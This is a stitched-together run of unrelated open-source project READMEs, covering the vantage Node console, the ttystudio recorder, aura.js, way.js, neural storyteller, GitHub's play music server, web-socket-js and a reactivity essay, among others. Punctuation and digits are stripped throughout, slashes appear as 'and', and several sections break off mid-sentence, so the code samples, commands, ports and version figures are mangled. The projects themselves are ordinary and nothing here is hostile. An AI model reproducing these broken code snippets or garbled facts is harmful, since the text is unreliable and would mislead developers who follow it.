provides help for a given command exit options exits instance of vantage use module installs a vantage extension in realtime vantage server connects to another application running vantage foo outputs bar that s the basic idea once you get the hang of it read on to learn some of the fancier things vantage can do starts vantage as a server if you just want it to listen on a port independent of your web application simply pass in the port and vantage will spawn a new http server every time a client connects to vantage the connection callback will be thrown and include the socket io connection object var vantage new vantage vantage listen  function socket this log accepted a connection if you want vantage to listen on the same port as your web application you can use vantage s listen function in place of your existing web server s listen function this is useful when running clustered instances of your server such as behind a reverse proxy where every instance has a separate port that can only be accessed internally in this way you can hop into any running instance without having to remember a separate set of ports var koa require koa var vantage require vantage var vantage new vantage var app koa vantage listen app  var express require express var vantage require vantage var vantage new vantage var app express vantage listen app  var hapi require hapi var vantage require vantage var vantage new vantage var server new hapi server vantage listen server  server start you can pass detailed options to your web server with the second argument in place of the port these options are the same options you would pass into your web server with a few exceptions options port tells vantage what port to listen on options ssl a boolean that tells vantage whether to spawn an http or https server options logactivity when true a tty acting as a vantage server that receives a connection will log when clients log in and out of the server defaults to false default https server example var vantage new vantage vantage listen somemiddleware port  ssl true key fs readfilesync and and and server key  cert fs readfilesync and and and server crt  ca fs readfilesync and and and ca crt  requestcert true rejectunauthorized false sets a banner for display when logging into a given vantage server var banner and welcome to joescrabshack com and and all connections are monitored and recorded and disconnect immediately if you are not an authorized user and  delimiter appsvr  banner banner listen  vantage  connecting to      connected successfully note see authentication section for auth details if your vantage server is listening on a public facing web port such as  or  your organization s firewall is not going to help you this is a barebones ip firewall for limiting connections down to your internal subnets for sensitive applications this obviously does not replace authentication sets the default policy for the firewall to either accept or reject any request that does not match a rule will fall back to this policy returns vantage firewall defaults to accept and and this will reject all remote connections vantage firewall policy reject allows a particular address and subnet to connect to vantage returns vantage firewall if no arguments are passed returns the currently applied policy vantage firewall policy reject accept     and  accept       console log vantage firewall policy and and reject denies access to a particular address and subnet returns vantage firewall vantage firewall policy accept reject       reject     and  returns an array of applied rules console log vantage firewall rules and and ip      subnet  rule reject reverts vantage firewall to an accept policy and erases all rules uses a given authentication strategy pass the required middleware into the first variable and any options and configuration for that middleware as given in that module s documentation into the options parameter var pam require vantage auth pam vantage auth pam options vantage basic auth is built in and so can be used with the basic string instead of requiring a module var users user admin  pass k jx s  user user  pass unicorn var vantage require vantage vantage auth basic  users users retry  retrytime  deny  unlocktime  if no vantage auth function is declared your app will not require authentication as a security measure if your nodeenv environment variable is not set to development and there is no authentication vantage will disallow remote connections to permit remote connections without authentication simply set your nodeenv to development you can publish your own custom authentication strategies for vantage js as its own node module i am currently looking to team up with a rocket scientist like you to build a pam based authentication strategy for vantage if you are interested send me a note the format for publishing a strategy is simple module exports function vantage options and and the vantage instance is exposed through and and the vantage parameter options exposes and and options passed in by the strategy s user and and and is defined by you and and this is where you can persist the log on state of and and the users attempting to log in etc and and you return a function which executes and and in the same context as a vantage command and and every time the user attempts to connect and and this function runs in it you can prompt and and the user etc return function args callback args exposes several pieces of data you can use and and if the user pre passes auth data it will be and and available here otherwise prompt him for it user admin  pass unicorn  and and this is based on socket io s connection handshake and and and has a lot more data than this handshake host      port   and and prompt user and look up credentials etc and and authentication is determined by your and and callback callback message authenticated and and example of rejected auth callback invalid credentials  false and and example of accepted auth and and callback void  true vantage extends eventemitter prototype simply use vantage on event  fn and vantage emit event  data the following events are supported vantage uses socket io to handle all communication between instances the following events map to the default socket io events clientconnect maps to connect for socket io client clientconnecterror maps to connecterror for socket io client clienterror maps to error for socket io client clientdisconnect maps to disconnect for socket io client serverconnection

exec bake pizza  function err pizza if err app eat pizza just like vorpal vantage supports extensions creating extensions is simple and is covered in vorpal s documentation that s okay here s what happened  in my terminal i started a local node web server node websvr js normally you would simply see what you logged and would have no interaction with node instead vantage gave us a prompt websvr  i typed help  which gave me a list of all of vantage s built in commands as well as commands i added  in my websvr js  i gave vantage a command that would turn on logging only for web requests by logging domains of activity this assists productivity in debugging to run this i typed debug web  and it started logging all web requests  i then typed debug off  which disabled log output  by then entering the repl command i entered a special repl mode where i can access the raw javascript and objects in my application while it s running this is the equivalent of running node in your terminal except it is in the context of your live application  satisfied with repl mode i exited out of it with the exit command  so that s nice you can access the local node instance in your terminal but what about remote or daemonized applications by using the built in vantage command i remotely connect to my node database api listening on port   by running vantage       just like ssh i m now in the new instance and my prompt changed to dbsvr  this server supports another vantage mode by typing sql  i enter sql mode using this i typed an arbitrary sql command and it connected to my database and executed it when done i entered exit  i felt like checking out the latest trend on hacker news i typed help and was disappointed to find there was no hacker news api command  fortunately someone made an extension for that an npm module called vantage hacker news to download it and import the commands into vantage in realtime i typed use vantage hacker news  with this command vantage did a temporary npm install on the module and loaded it into the application s memory by typing help again i can see i now have a new vantage command registered hacker news  i used the command hacker news length   and this showed me the top  items trending on hacker news one of them was obviously an article on the node event loop because node is awesome  satisfied i typed exit  which brought me back to my web server  i then typed exit f for force to actually quit the web server which was running locally in my terminal ah show me the gif again i get it i get it tell me more contents

38657802, a terminal to gif recorder minus the headaches  record your terminal and compile it to a gif or apng without any external dependencies bash scripts gif concatenation etc install with npm install ttystudio add g for global install ttystudio output gif log hello world q stop recording with ctrl q initializing writer writing image writing head writing frame   left writing frame   left writing frame   left writing frame   left writing eof wrote image to and home and chjj and output gif chromium output gif firefox output png ttystudio differs from other terminal recorders in that  it has its own built in gif and apng writer no imagemagick required the writer now has built in frame offset optimization  it has a font parser to render the font during image writing so no terminal playback is required when writing the image this also means no gui is required at all you can record on a remote machine via ssh  no concatenation of hundreds of gif files required ttystudio automatically writes out to one gif or apng  no glitchy frames due to imperfect gui recording of the playback or gif concatenation  ttystudio will record frames even if nothing is being updated on the screen this project has ended up making use of years of work i ve done writing terminal libraries my personal obsession once all the pieces were there this project became possible it also sprang out of a need to find a terminal to gif recorder that actually worked sup note the above gif was recorded with ttystudio nested ttystudio instances cause a slight glitch where the cursor is not visible not to matter in most cases and sup ttystudio output gif log record and compile ttystudio frames json log record ttystudio frames json output gif range   compile ttystudio record frames json interval  grab each frame on a ms interval hello world q stop recording with ctrl q ttystudio compile frames json output gif log parsing json initializing writer writing image writing head writing frame   left

blessed and term js term js and pty js pty js will spawn a pseudo terminal to let you record until you press q  ttystudio compile frames json output gif ttystudio will parse each set of frames into a bitmap keeping in mind the foreground color and character in each cell  it will use its parsed font terminus un and b by default to render pixels for each characters in the image  it will write out each frame to a gif or png file of your choice it s that simple no bash script to run no gifs to concatenate no external dependencies required i e ffmpeg or imagemagick ttystudio does it all on its own in  javascript aside from pty js which is a node c and and binding to spawn terminals compiling to apng ttystudio frames json output png log accidentally recorded something you don t want in your image the range option can help ttystudio frames json output gif log range   the delay option sets the delay between frames in the final image ttystudio frames json output png log delay  the no palette and rgba option can be used to avoid use a global palette color type  when compiling apngs this is known to cause high memory usage when building the palette since it has to parse every frame beforehand instead it will use color type  rgba this will make the apng larger but does not risk ooming the process ooming the process is unlikely to happen but if it does this option is here use pngcrush afterwards to optimize ttystudio frames json output png log rgba ttystudio frames json and feh replaying frames in the terminal ttystudio play frames json adding a border ttystudio output gif

ttystudio in screenshot mode it will take a screenshot on c p unless specified otherwise by screenshot key screenshot key set the screenshot key when in screenshot mode default is c p version display ttystudio version h help display help information since ttystudio does not record a gui it needs to know which font you want to use it has no real idea of the font your terminal is using ttystudio uses terminus ter un and b by default but you can change this your font must be in bdf bdf format once you have your font ready place it in the fonts and directory in ttystudio and run make ttystudio and pxxl js will convert the bdf font to a glyph bitmap format in a json file which is what ttystudio uses cp and ter un bdf and ttystudio and fonts and cp and ter ub bdf and ttystudio and fonts and

18727860,  deprecated this project is not maintained anymore draggable panel is an android library created to build a draggable user interface similar to the new youtube draggable video component based on fragments or views this android library offers you two main classes to use and create your own awesome user interfaces if you want to use it with fragments add draggablepanel to your layout if you want to use it with views use draggableview and put your views inside this new component has been created using some concepts described on flavien laurent blog  and denevell blog  to create this library i ve used an android component called viewdraghelper  and viewdraghelper calback  this component doesn t have too much documentation and that s the reason why i ve added some javadoc to my code in order to clarify the component usage this library works on android  x or higher versions but not in lower versions because the scale effect is not going to work properly when the user try

2723064, at this time we are aware that a number of developers are using aura in production and welcome help with improving the core codebase via patches feedback or improvements to our documentation we have not yet had time to refactor the codebase into a set of web components per the last periodic update  but are still interested in doing this if you are interested in taking over core maintenance of the project please feel free to get in touch two years on the maintainers of aurajs agree that the future of decoupled scalable applications lie in web components a set of standards composed of custom elements templates imports and shadowdom aimed at offering a way to build encapsulated components using features found in the browser to this end our efforts on aurajs moving forward will be focused on how it can help enable patterns for scalability developers using aurajs    and below will still be able to contribute to the current stable version of the project there are large projects already built with it  however support for this version will be limited as we work on the designs for our next major version we are more than happy to accept any contributions that meet our guidelines and will be reviewing the issue tracker for this version as time allows our team are excited about the future direction of the project and look forward to announcing more news about our work here in the future we ve seen a large shift in the javascript community for the past  years with people starting to write web apps in a much more structured way yet assembling the bits and pieces and actually starting to make apps is still a challenge another challenge is that most of the time you end up doing the same stuff all over again you need a way to authenticate users give them ways to communicate exchange ideas work or play together you have to integrate with external services or apis like facebook or twitter web apps are all about the end user experience ui dom elements the web development ecosystem is all about much more low level stuff we need a way to package higher level abstractions and make them truly reusable and that s what aura is all about need some more reasons to use aura it s basically glue for your application components making it trivial to tie together a number of independently created components into a fully functional application a complete event bus supporting application level and component level communication mean you have control over what is getting triggered in your app specify an api end point for components easily and just use data attributes to include any component or components minimal javascript for more capabilities abstract away utility libraries you are using templating dom manipulation so that you can swap them out for alternatives at any time without a great deal of effort hit the ground running quickly components into reusable modules using amd bower is a first class citizen in aura making it easier to manage your application dependencies the web platform is moving towards using scoped styles and shadow dom for keeping parts of your page safe from third party content that might affect it aura does the same for communications by introducing per component sandboxes for your events tooling for scaffolding out new components without having to write as much boilerplate can be used with your mvc framework of choice we re just there as a helper first class support for the hull io platform if you don t want to create a component yourself you can easily use them as a components source and create apps in less time extensible via the extensions system which make a good basis for a rich ecosystem around the project your application will be an instance of the aura object its responsibilities are to load extensions when the app starts and clean them up when the app stops extensions are loaded in your application when it starts they allow you to add features to the application and are available to the components through their sandbox the core implements aliases for dom manipulation templating and other lower level utilities that pipe back to a library of choice aliases allow switching libraries with minimum impact on your application when your app starts it will create an instance of sandbox in each of your components a component represents a unit of a page each component is independent  run npm install to install build dependencies  run bower install to install lib dependencies  run grunt build and aura js will be placed in dist and run npm test the first step in creating an aura application is to make an instance of aura var app new aura now that we have our app  we can start it app start components body this starts the app by saying that it should search for components anywhere in the body of your html document by default components are retrieved from a directory called components and that must be at the same level as your html document let s say we want to create a hello component to do that we need to create a components and hello and directory this directory must contain a main js file it will bootstrap and describe the component it is mandatory no matter how small it can be all the other files that your component needs models templates for our hello component the main js will be initialize function this el html h hello aura and h add the following code to your html document aura will call the initialize method that we have defined in components and hello and main js imagine that we need an helper to reverse a string in order to accomplish that we ll need to create an extension define extensions and reverse  initialize function app app core util reverse function string return string split reverse join extensions can then be loaded by your app by referencing them with their module name to make our reverse helper available in our app run the following code this will call the initialize function of our reverse extension var app aura app use extensions and reverse app start components body calling use when your app is already started will throw an error sandbox on name listener context sandbox off name listener sandbox emit name data below we can see an example of a backbone view using the mediator to emit a notification when tasks have been cleared and subscribing to changes from tasks stats in order to render when they are updated define hbs and stats  function template return type backbone  events click button clearcompleted initialize function this render this sandbox on tasks stats  this render this render function stats this html template stats and and clearcompleted function this sandbox emit tasks clear to enable debug extension and logging pass debug enable true into the aura constructor var app new aura debug enable true logger usage and and you can use logger from components or extensions var logger sandbox logger logger log hey logger warn hey logger error hey and and or directly from aura app var logger app logger below we can see an example how to enable logging in specific ext and components by default all loggers are enabled var app new aura debug enable true components aura mediator login signup info built in components aura mediator event logging also when debug mode is enabled you can declare following function for any debug purposes and and function will be called for all aura apps in your project window attachdebugger function app and and do cool stuff with app object console log app and and maybe you want to have access to aura app via developer console window aura app first make a new directory and cd into it mkdir my awesome project cd  then install generator aura npm install g generator aura run yo aura  optionally passing an app name yo aura app name finally install npm and bower dependencies npm install bower install dev available generators aura component component aura extension extension aura styles styles generates a component in app and components yo aura component sample produces app and components and sample and main js generates a extension in app and extensions yo aura extension storage produces app and extensions and storage js generates cool styles yo aura styles default normalize css twitter bootstrap twitter bootstrap for compass zurb foundation want to look at some sample apps built with aura check out the architecture and the fact that aura components are completely decoupled will allow us to build an ecosystem of components that people can reuse internally or share with others with componentsources and require we can load only the components that are needed by the app at runtime no js is required to wire everything up just include components with data attributes in their markup mediation same thing here it s a prerequisite to make everything decoupled but in addition it allows us to write much less code template overrides ftw

38846351, this is a project designed to help controlling android mediaplayer class it makes it easier to use mediaplayer listview and recyclerview also it tracks the most visible item in scrolling list when new item in the list become the most visible this library gives and api to track it it consists from two libraries  video player manager it gives the ability to invoke mediaplayer methods in a background thread it has utilities to have only one playback when multiple media files are in the list before new playback starts it stops the old playback and releases all the resources  list visibility utils it s a library that tracks the most visible item in the list and notifies when it changes note there should be the most visible item if there will be  or more items with the same visibility percent the result might be unpredictable recommendation is to have few views visible on the screen view that are big enough so that only one view is the most visible look at the demo below these two libraries combined are the tool to get a video playback in the scrolling list listview recyclerview  we cannot use usual videoview in the list videoview extends surfaceview and surfaceview doesn t have ui synchronization buffers all this will lead us to the situation where video that is playing is trying to catch up the list when you scroll it synchronization buffers are present in textureview but there is no videoview that is based on textureview in android sdk version  so we need a view that extends textureview and works with android mediaplayer  almost all methods prepare start stop etc from mediaplayer are basically calling native methods that work with hardware hardware can be tricky and if will do any work longer than ms and it sure will then we will see a lagging

22845841, simple lightweight persistent framework agnostic two way databinding javascript library with no to little js code to write and no dependencies declare an html element with some tags form way data myformdata way persistent true input type text name name input type text name age input type text name gender and form name span way data myformdata name and span boom now every change in the form will be stored in memory the bound span s html will be changed on the fly and the bound data will be persistent meaning your html will be populated with your data on page reloads step  include the library to your page  a via npm npm install way js javascript import way js  b or step  there is no step  you are good to go options can be passed via data attributes or javascript for data attributes append the option name to way  as in way data set these options to the elements that have to be bound name and type and default and description and and and data and string and null and allows to define the dot separated path where the data will be stored can include arrays when used on a form a json variable made of all the included inputs with a name attribute will be created and stored in the specified storage pass the  all   path to access all way js data default and string and null and a link to a default data to set on an element in case there is no bound value persistent and boolean and true and allows to store the data to localstorage everytime the bound data changes readonly and boolean and false and prevents the element changes from resetting the bound value writeonly and boolean and false and prevents the element from getting changed when the bound value changes json and boolean and false and returns pretty printed json data to its dom element html and boolean and false and declares whether the data attributed to an element should be parsed as html or not pick and array and null and a comma separated list of values to pick in forms only to sync with the storage by default all form inputs are synced omit and array and null and a comma separated list of values in forms only to not sync with the storage by default no form input is omitted some examples form way data some form way pick somepropertiesthatcan be nested form way data some form way omit dontwant those prettyprint you can set scopes to your dom elements data way scope attribute passing this attribute to an element will point all its children s way data attributes to this scope scopes can be nested javascript way set somescope  with something hello way scope break attribute breaks a scope chain all the child elements of this one will have no scope set javascript way set somescope  with something hello scope method returns the scope of a given dom element javascript way dom somediv scope somescope with duplicates a dom element for each of the values it can loop through in a way js passed data repeat blocks automatically set the appropriate scope to their child elements on each loop key corresponds to the key of the current element looped having this javascript way set some list  name pierre  name paul  name jacques key span way data name and span will render that  span way data name pierre and span  span way data name paul and span  span way data name jacques and span transforms the displayed data bound to your dom elements way transform attribute pass transform functions by name add multiple transforms by separating them with the and symbol in case of conflicts between transforms the last mentionned transform wins some pre build transforms pr welcome for more name and description and example and and uppercase and sets a string to uppercase and hello becomes hello lowercase and sets a string to lowercase and hello becomes hello reverse and reverses a string and hello becomes olleh javascript way set somedata  hello registertransform name transform method adds a new transform javascript way set somedata  hello way registertransform lolify  function data return data and lol filters the displayed data within your way repeat blocks way filter attribute pass filter functions by name add multiple filters by separating them with the

elements javascript way set somearray  color red  color red  color blue  color green color green and and will render something like registerfilter name filter method adds a new filter allows to perform simple tasks on your way js data with a click attribute and description and way action remove and removes a way data way action push and if provided with an array pushes an null value to it javascript way set some list  i  am  list javascript clicktoremove click clicktopush click way get some list i  am  null for images only way js adds classes to your dom elements to easily detect load and error and success statuses with the data they get passed class and description and way loading and when an image is getting downloaded to a dom element way error and when no image is returned from the url provided way success and when well you got it javascript way set image url  somethingthatsnotanimageurl everything should be done for you from the html tags but if necessary you can also use helper functions to interact with your stored data and dom elements way dom element tostorage options stores the element s value to the in store memory javascript way dom someform tostorage way dom

45137369, neural storyteller is a recurrent neural network that generates little stories about images this repository contains code for generating stories with your own images as well as instructions for training new models we were barely able to catch the breeze at the beach  and it felt as if someone stepped out of my mind she was in love with him for the first time in months  so she had no intention of escaping the sun had risen from the ocean  making her feel more alive than normal she s beautiful  but the truth is that i do n t know what to do the sun was just starting to fade away  leaving people scattered around the atlantic ocean i d seen the men in his life  who guided me at the beach once more the whole approach contains  components style shifting described in this project parallel to this we train a visual semantic embedding between coco images and captions in this model captions and images are mapped into a common vector space after training we can embed new images and retrieve captions given these models we need a way to bridge the gap between retrieved image captions and passages in novels that is if we had a function f that maps a collection of image caption vectors x to a book passage vector f x  then we could feed f x to the decoder to get our story there is no such parallel data so we need to construct f another way it turns out that skip thought vectors have some intriguing properties that allow us to construct f in a really simple way suppose we have  vectors an image caption x  a caption style vector c and a book style vector b then we define f as f x x c and b which intuitively means keep the thought of the caption but replace the image caption style with that of a story then we simply feed f x to the decoder how do we construct c and b here c is the mean of the skip thought vectors for microsoft coco training captions we set b to be the mean of the skip thought vectors for romance novel passages that are of length  skip thought vectors are sensitive to length if you bias by really long passages it will decode really long stories punctuation vocabulary syntactic style loosely speaking for the last point if you bias using text all written the same way the stories you get will also be written the same way this code is written in python to use it you will need python   a version of theano that lasagne supports you will first need to download some pre trained models and style vectors most of the materials are available in a single compressed file which you can obtain by running included is a pre trained decoder on romance novels the decoder dictionary caption and romance style vectors ms coco training captions and a pre trained image sentence embedding model finally we need the vgg  convnet parameters you can obtain them by running note that this model is for non commercial use only once you have all the materials open config py and specify the locations of all of the models and style vectors that you downloaded for running on cpu you will need to download the vgg  prototxt and model by you also need to modify pycaffe and model path in config py  and modify the flag in line  as flagcpumode true the images directory contains some sample images that you can try the model on in order to generate a story open ipython and run the following import generate z generate loadall generate story z and images and ex jpg if everything works it will first print out the nearest coco captions to the image predicted by the visual semantic embedding model then it will print out a story there are  knobs that can be tuned for generation the number of retrieved captions to condition on as well as the beam search width the defaults are generate story z and images and ex jpg  k  bw  where k is the number of captions to condition on and bw is the beam width these are reasonable defaults but playing around with these can give you very different outputs the higher the beam width the longer it takes to generate a story if you bias by song lyrics you can turn on the lyric flag which will print the output in multiple lines by comma delimiting neuralstoryteller zip contains an additional bias vector called swiftstyle npy which is the mean of skip thought vectors across taylor swift lyrics if you point pathtoposbias to this vector in config py  you can generate captions in the style of taylor swift lyrics for example generate story z and images and ex jpg  lyric true should output you re the only person on the beach right now you know i do n t think i will ever fall in love with you and

attributedstring so you can use the icon on a label with one line of code self label attributedtext staricon attributedstring self label attributedtext staricon attributedstring you don t need to set the label s font property it s already been taken care of instead of getting the attributed string you can draw the icon onto an image like this uiimage iconimage staricon imagewithsize cgsizemake   let iconimage staricon image with cgsize width  height  this will use the attributes you ve set to draw that image you only need to specify a size for the image by default the icon is centered horizontally and vertically i believe that s  what you want however if it s not centered properly you can set the drawingpositionadjustment property for the icon like this staricon drawingpositionadjustment uioffsetmake   you can set the background color for the image like this staricon drawingbackgroundcolor uicolor blackcolor staricon drawingbackgroundcolor uicolor black by default the background is transparent as the name implies this property only takes effect while drawing on image you can specify a gradient color to create a gradient background check the example

1539787, play is an employee powered itunes based client driven distributed music server for your office also it can prepare your taxes did you know that listening to music while you work produces better and faster code it s true it s in a readme we listen to music constantly at github so i wrote play initially it was a modest shell oriented music server but we ve since grown it to quite the setup we have employees all over the world but play lets us all listen to the same music as if we were all in the office together this has actually made a big impact on our culture play is built for the mac we use a mac mini play is itunes based that means we can let itunes do what it s good at and manage the state of our music we use itunes dj to handle the main play queue specifically because it emulates what play does provide a smart playlist of neverending songs we use nicecast nicecast to take the audio stream from itunes and deliver it to our client apps so everyone can stream from their platform of choice we also use itunes built in airplay support to stream to multiple speakers across our office network the heart of play is the web app this is effectively an api to access and control your itunes library over the web the app also handles music upload just drag your files to the browser window then they ll get uploaded and indexed in itunes no complex file sharing and office vpn setups necessary allows play to provide realtime updating to any client that cares this includes the site as well as play clients clients will be updated in realtime as play cycles through songs as well as when new songs get queued we primarily drive play through campfire campfire  the chat service we use internally at github most play interactions happen through the api rather than the web interface and the api is actually a superset of the functionality available through the web play has a lot of moving parts but we ve tried to simplify installation as much as we could first clone down the repository next you need to run the bootstrap process which will verify that we can talk to itunes that you have all of your settings set up correctly and will guide you through the configuration setup script and bootstrap during the bootstrap process you ll be asked to enter your pusher pusher credentials this is optional but it ll let you get realtime updates to your play queue it s like the future websockets and shit open up itunes and start playing music from the itunes dj playlist it s important that you do this first yes the dj playlist is required itunes match is mostly not supported see more details on this at the bottom of this readme at this point you should be ready to play rake start we use play primarily through campfire through hubot there s a file that you can drop into your hubot installation for integration with play each user on play has a unique auth token they will give this token to each play client for it to make requests on their behalf both of these styles tokens can be included as a header or as a query param when using a user s token  only the token needs to be included it can be added to the request in the header or as a query param authorization fd token fd when using a system token a login needs to be added to the request in addition to the system token added by the means described above it can be added to the request in the header or as a query param x play login maddox login maddox part of the fun with play is getting it everywhere in your office on your desktop and on your phone once you get play set up correctly you ll need to install nicecast nicecast the following clients exist for play we also have a tv at the office with the currently playing song this doesn t require any setup just point your tv s browser at the main play instance and the tv interface should show up as long as the screen ratio is   ie p or p the entire play and itunes bridge is handled via applescript play talks to applescript applescript talks to itunes and we make it dance the web app is a simple straightfoward sinatra app state that we can t stash in itunes is persisted through redis the entire web app is just a thin client over the api which is delivered through json we only really deliver one html page the main root page all data on that page is populated via json requests this means we can focus on one api and use it for both the web and for every other client the frontend is built with scss coffeescript mustache pusher and jquery all assets are compiled and delivered via sprockets what is currently playing and with some

sample html in your browser  after onopen is shown input something click send and confirm echo back  first argument of echoserver rb means that it accepts web socket connection from html pages in example com copy swfobject js websocket js websocketmain swf to your application directory write javascript code script type text and javascript and and let the library know where websocketmain swf is websocketswflocation websocketmain swf and and write your code in the same way as for native websocket var ws new websocket ws and and example com  and ws onopen function ws send hello and and sends a message ws onmessage function e and and receives a message alert e data ws onclose function alert closed and script put flash socket policy file to your server unless you use web socket ruby or em websocket as your websocket server see flash socket policy file section below for details if it doesn t work try these  try chrome and ie  or  it s likely an issue of your code or the server debug your code as usual e g using console log it s likely an issue of web socket js specific configuration e g  and  below check supported environment section below your browser may not be supported by web socket js  add this line before your code websocketdebug true and use developer tools chrome and safari or firebug firefox to see if console log outputs any errors  make sure you host your html page and websocketmain swf in the same domain otherwise see how to host html file and swf file in different domains section  if you are not using web socket ruby or em websocket as your websocket server you need to place flash socket policy file on your server see flash socket policy file section below for details  check if sample html bundled with web socket js works  make sure the port used for websocket  in example above is not blocked by your server and client s firewall the websocket server library you use e g em websocket pywebsocket and its version the web browser you use and its version the exact message you are trying to send from the server or the client the result of all steps above especially error message in step  if any it should work on google chrome  or later firefox  or later uses native websocket or mozwebsocket implementation firefox  to  internet explorer   and flash player  or later it may or may not work on other browsers such as safari opera or ie  patch for these browsers are appreciated but i will not work on fixing issues specific to these browsers by myself you need some more lines in your javascript code see how to use it in your application section above for details it requires flash player  or later unless the browser supports native websocket your server must provide flash socket policy file unless you use web socket ruby or em websocket see flash socket policy file section below for details it has limited support for cookies on websocket see cookie support section below for details it doesn t use proxies specified in browser config see proxy support section below for details this implementation uses flash s socket which means that your server must provide flash socket policy file to declare the server accepts connections from flash the article above perl implementation actually it s still better to provide socket policy file at port  even if you use web socket ruby or em websocket flash always try to connect to port  first so providing the file at port  makes startup faster web socket js has limited supported for cookies on websocket cookie is sent if web socket host is exactly the same as the origin of javascript the port can be different otherwise it is not sent because i don t know way to send right cookie which is cookie of the host of web socket i heard also httponly cookies are not sent note that it s technically possible that client sends arbitrary string as cookie and any other headers by modifying this library for example once you place flash socket policy file in your server so don t trust cookie and other headers if you allow connection from untrusted origin the as socket class doesn t implement this mechanism which renders it useless for the scenarios where the user trying to open a socket is behind a proxy the class rfcsocket by christian cantrell effectively lets us implement this as long as the proxy settings are known and provided by the interface that instantiates the websocket as such if you want to support proxied conncetions you ll have to supply this information to the websocket constructor when flash is being used one way to go about it would be to ask the user for proxy settings information if the initial connection fails by default html file and swf file must be in the same domain you can follow steps below to allow hosting them in different domain warning if you use the method below html files in any domains can send arbitrary tcp data to your websocket server regardless of configuration in flash socket policy file arbitrary tcp data means that they can even fake request headers including origin and cookie  unzip websocketmaininsecure zip to extract websocketmaininsecure swf  put websocketmaininsecure swf on your server instead of websocketmain swf  in javascript set websocketswflocation to url of your websocketmaininsecure swf cd flash src and build sh new bsd license

22777776, a work in progress there are three recordings of a presentation of a general theory of reactivity oscon  mediterraneajs  midwestjs the presentation includes figures and animations not presented here in the context of a computer program reactivity is the process of receiving external stimuli and propagating events this is a rather broad definition that covers a wide variety of topics the term is usually reserved for systems that respond in turns to sensors schedules and above all problems that exist between the chair and keyboard the field of reactivity is carved into plots ranging from reactive programming to the subtly distinct functional reactive programming  with acrage set aside for self adjusting computation and with neighbors like bindings and operational transforms adherents favor everything from continuation passing style to promises  or the related concepts of deferreds and futures other problems lend themselves to observables  signals  or behaviors  and everyone agrees that streams are a good idea but publishers and subscribers are distinct in  einstein created a theory of special relativity that unified the concepts of space and time and went on to incorporate gravity to bring the three fundamentals of physical law into a single model to a similar end various rx minds in the field of reactivity have been converging on a model that unifies at least promises and observables and and singular and plural and and and and and and spatial and value and iterable lt value gt and and temporal and promise lt value gt and observable lt value gt and however this description fails to capture all of the varigated concepts of reactivity rather rx conflates all reactive primitives into a single observable type that can perform any role just as an array is an exemplar of an entire taxonomy of collections promises streams and observables are merely representatives of their class of reactive primitives as the common paraphrase of einstein goes everything should be made as simple as possible but no simpler for the purpose of discussion we must establish a vocabulary some of these names have a long tradition or at least some precedent in javascript some are disputed borrowed or fabricated a value is singular and spatial it can be accessed or modified if we break this atom it will fall into two parts the getter and the setter data flows in one direction from the setter to the getter the duality of a getter and a setter a producer and a consumer or a writer and a reader exists in every reactive primitive erik meijer shows us the parallelism and reflection that exists between various types of reactive duals in his keynote for lang next  em singular is as opposed to plural or multiple an array or generally any collection contains multiple values an iterator is a plural getter a generator and iterator form the plural dual for values in space spatial is as opposed to temporal reactivity is about time a promise is a getter for a single value from the past or the future in javascript and in the language e from which we borrowed the concept the corresponding setter is a resolver collectively an asynchronous value is a deferred if a promise is the temporal analogue of a value a stream is the temporal analogue of an array the producer side of a stream is a writer and the consumer side is a reader a reader is an asynchronous iterator and a writer is an asynchronous generator and interface and and and and and and and and and and value and value and singular and spatial and and getter and getter and singular and spatial and and setter and setter and singular and spatial and and array and value and plural and spatial and and iterator and getter and plural and spatial and and generator and setter and plural and spatial and and deferred and value and singular and temporal and and promise and getter and singular and temporal and and resolver and setter and singular and temporal and and stream and value and plural and temporal and and reader and getter and plural and temporal and and writer and setter and plural and temporal and an observer can subscribe to eventually see the value of a promise they can do this before or after the promise has a value any number of observers can subscribe multiple times and any single observer can subscribe to the same promise multiple times as such promises model dependency promises and resolvers can be safely distributed to any number of producers and consumers if multiple producers race to resolve a promise the experience of each producer is indistinguishable regardless of whether they won or lost the race likewise if multiple consumers subscribe to a promise the experience of each consumer is indistinguishable one consumer cannot prevent another consumer from making progress information flows in one direction promises make reactive programs more robust and composable promises are broadcast the law that no consumer can interfere with another consumer makes it impossible for promises to abort work in progress a promise represents a result not the work leading to that result a task has mostly the same form and features as a promise but is unicast by default and can be cancelled a task can have only one subscriber but can be explicitly forked to create a new task that depends on the same result each subscriber can unsubscribe and if all subscribers have unsubscribed and no further subscribers can be introduced a task can abort its work tasks are unicast and therefore cancelable see the accompanying sketch of a task implementation there is also an esoteric difference between a promise and a future promise resolvers accept either a value or a promise and will recursively unwrap transitive promises for promises in most if not all strongly typed languages this behavior makes it hard if not impossible to infer the type of a promise a future is a promise s strongly typed alter ego which can take advantage of type inference to avoid having to explicitly cast the type of a promise promises tasks and futures are three variations of a singular reactive value they vary by being either broadcast or unicast or by being suitable for strong or weak type systems there are many plural reactive value types each has a different adaptation for dealing with limited resources a stream has many of the same constraints as an array imagine a plane with space and time if you rotate an array from the space axis to the time axis it would become a the order is important and every value is significant consumers and producers are unlikely to process values at the same rate if the consumer is faster than the producer it must idle between receiving if a producer is faster than their corresponding consumer it must idle between sending values this pushing and pulling is captured by the concept of pressure on the producer side a vacuum stalls the consumer and a pressure sends values on the consumer side a vacuum draws values forward and pressure often called back pressure  stalls the producer pressure exists to ensure that every value transits the setter to the getter since the consumer of a stream expects to see every value streams are unicast like tasks as they are unicast they are also cancelable streams are a cooperation between the reader and the writer and information flows both ways data flows forward acknowledgements flow backward and either the consumer or producer can terminate the flow although a stream is unicast it is certainly possible to branch a stream into multiple streams in a variety of ways a fork in a stream is an operator that ensures that every value gets sent to each of an array of consumers the slowest of the forks determines the pressure so the pressure of a fork can only be higher than that of a single consumer the simpler strategy of providing a stream to multiple consumers produces a  round robin load balancing effect where each consumer receives an exclusive possibly random portion of the stream the pressure of a shared stream can only be lower than that of a single consumer in the following example the map operator creates two new streams from a single input stream the slow map will see half as many values as the fast map the slow map will consume and produce five values per second and the fast map will consume and produce ten sustaining a maximum throughput of fifteen values per second if the original stream can produce values that quickly if the original stream can only produce ten or less values per second the values will be distributed fairly between both consumers var slow stream map function n return promise return n delay  var fast stream map function n return promise return n delay  in contrast publishers and subscribers are broadcast information flows only one direction from the publishers to the subscribers also there is no guarantee of continuity the publisher does not wait for a subscriber and the subscriber receives whatever values were published during the period of their subscription a stream would buffer all values produced until the consumer arrives with time series data  values that change over time but belie the same meaning order and integrity may not be important for example if you were bombarded with weather forecasts you could discard every report except the one you most recently received alternately consider a value that represents the current time since the 